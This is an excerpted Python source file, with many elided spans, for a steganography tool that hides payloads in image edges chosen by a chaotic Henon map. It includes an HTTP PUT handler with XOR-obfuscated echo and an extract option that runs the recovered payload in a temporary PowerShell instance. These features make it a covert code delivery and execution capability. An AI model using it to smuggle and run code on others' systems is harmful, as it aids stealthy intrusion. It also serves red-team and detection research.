...
class ChaosEdgeSteg:
    ...
    def adaptive_thresholds(self, __img: np.ndarray):
        ...
        edge_density = cv2.countNonZero(standard_edge_map) / (
            filtered_img.shape[0] * filtered_img.shape[1]
        )
        norm_payload_size = self.payload_len / (
            filtered_img.shape[0] * filtered_img.shape[1]
        )
        payload_influence = norm_payload_size * 100
        
        self.print_message(
            f'Normalized payload size: {norm_payload_size}', msg_type='debug'
        )
        ...
        if 2 <= payload_influence < 2.5:
            ...
            raise SteganographyError('Payload is too large for the given cover image')
        # Scale the thresholds towards min values
        threshold_scale = 1 - (edge_density + payload_influence)
        lower = int(base_lower + threshold_scale * (min_lower - base_lower))
        upper = int(base_upper + threshold_scale * (min_upper - base_upper))
        self.print_message(
            f'Thresholds after combined density adjustment: {lower, upper}',
            msg_type='debug',
        )
        return lower, upper
    ...
    def henon_parameters(self, __key: str):
        self.print_message(
            'Generating Henon parameters from key...', msg_type='verbose'
        )
    ...
    def map_edges_to_henon(self):
        ...
        if len(edge_coords) == 0:
            raise SteganographyError('No edge coordinates detected')
        
        henon_map = np.column_stack(self.henon_map())
        norm_indices = (henon_map - henon_map.min()) / (
            henon_map.max() - henon_map.min()
        )
        ...
        self.print_message(
            f'Available indices: {str(len(norm_indices))}', msg_type='debug'
        )
        ...
        for index in tqdm(
            ...
            # Store original index to check for full loop without available edge
            original_index = index
            while not available_edge_mask[index]:
                index = (index + 1) % len(edge_coords)
                # Raise error if no available edges found after full loop
                if index == original_index:
                    raise SteganographyError(
                        'Exhausted all available edge coordinates: Payload is too large for the '
                        'input image'
                    )
    ...
    def extract(self, __img_path) -> bytes:
        ...
        out_bin_payload = int(out_str, 2).to_bytes(
            (len(out_str) + 7) // 8, byteorder='big'
        )
...
class PutHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    ...
    def log_message(self, _, *args):
        if not self.log_printed:
            self.print_message(
                f'Received {self.command} request from {self.client_address[0]}:'
    ...
    def do_PUT(self):
        ...
        if self.echo:
            if self.obfuscate:
                obf_payload = xor_obf(
                    base64.b64encode(PutHTTPRequestHandler.out_payload), [0x55, 0xFF]
                )
...
def embed(args: argparse.Namespace):
    if args.payload and args.payload_file:
        raise ValueError("Cannot use '-p' and '-f' simultaneously")
    if args.payload:
        if os.path.isfile(args.payload) and args.payload.endswith(
            ('.txt', '.py', '.ps1')
        ):
        ...
        if not args.payload_file.endswith('.zip'):
            ValueError("Invalid payload file type. Only '.zip' archives are supported")
        with open(args.payload_file, 'rb') as file:
            payload = file.read()
    else:
        raise ValueError("Either '-p' or '-f' must be provided to specify the payload")
    payload_len = (
    ...
    steg = ChaosEdgeSteg(
        ...
        save_bitmaps=args.save_bitmaps,
        quiet=args.quiet,
    ...
    if args.save_key:
        if args.output_image_path:
            ...
            dirname = os.getcwd()
            print(
                'No output image path was specified. Saving key to the current directory'
            )
        ...
        (
            print(f"Key with hex length appended: '{prefixed_key_str}'")
            if not args.quiet
            else print(prefixed_key_str)
        )
    if args.output_image_path:
...
def extract(args: argparse.Namespace):
    ...
    if args.ps_execute and (args.echo or args.remote_output_file):
        raise ValueError("'ps_execute': Cannot be used with remote options")
    if args.ps_execute and not args.quiet:
        args.quiet = True
    if args.echo and not args.remote_stego_image:
        raise ValueError("'echo': Can only be used with 'remote_stego_image'")
    steg = ChaosEdgeSteg(
        args.key,
        args.cover_image_path,
        output_path=None,
    ...
    def handle_remote():
        ...
        extracted_payload = (
            PutHTTPRequestHandler.out_payload
            if PutHTTPRequestHandler.out_payload
...
def main_cli():
    ...
    embed_parser.add_argument(
        '-c', '--cover_image_path', required=True, help='Path to the cover image'
    )
    embed_parser.add_argument(
        '-p',
        '--payload',
        type=str,
        help=(
            "Payload to embed directly into the image as a string. "
            "Can also be a filepath ('.txt', '.py')"
        ),
    )
    embed_parser.add_argument(
        '-f',
        '--payload_file',
        type=str,
        help="Path to the payload file ('.zip' archive)",
    )
    embed_parser.add_argument(
        '-k', '--key', required=True, help='Key to use for embedding'
    )
    embed_parser.add_argument(
        '-o',
        '--output_image_path',
        ...
        help=(
            ...
            "If not specified, defaults to 'stego_<cover_image_name>'"
        ),
    )
    embed_parser.add_argument(
        '--save_key',
        action='store_true',
        default=False,
        help='Save key as a text file in the output directory',
    )
    embed_parser.add_argument(
        '--save_bitmaps', action='store_true', default=False, help='Save edge bitmaps'
    )
    embed_parser.add_argument(
        '-v',
        '--verbose',
    ...
    embed_parser.add_argument(
        '-vv', '--debug', action='store_true', default=False, help='Enable debug output'
    )
    embed_parser.add_argument(
        '-q',
        '--quiet',
    ...
    extract_parser = subparsers.add_parser(
        'extract', help='Extract payload from a stego image'
    )
    ...
    extract_parser.add_argument(
        ...
        required=True,
        help=(
            "Key used during embedding, with the payload length appended (e.g., '0000::key')"
        ),
    )
    ...
    echo_group = extract_parser.add_argument_group(
        'Echo options', 'Options related to echoing back the payload'
    )
    ...
    extract_parser.add_argument(
        ...
        default=False,
        help=(
            "Executes the extracted payload in a temp PowerShell instance. "
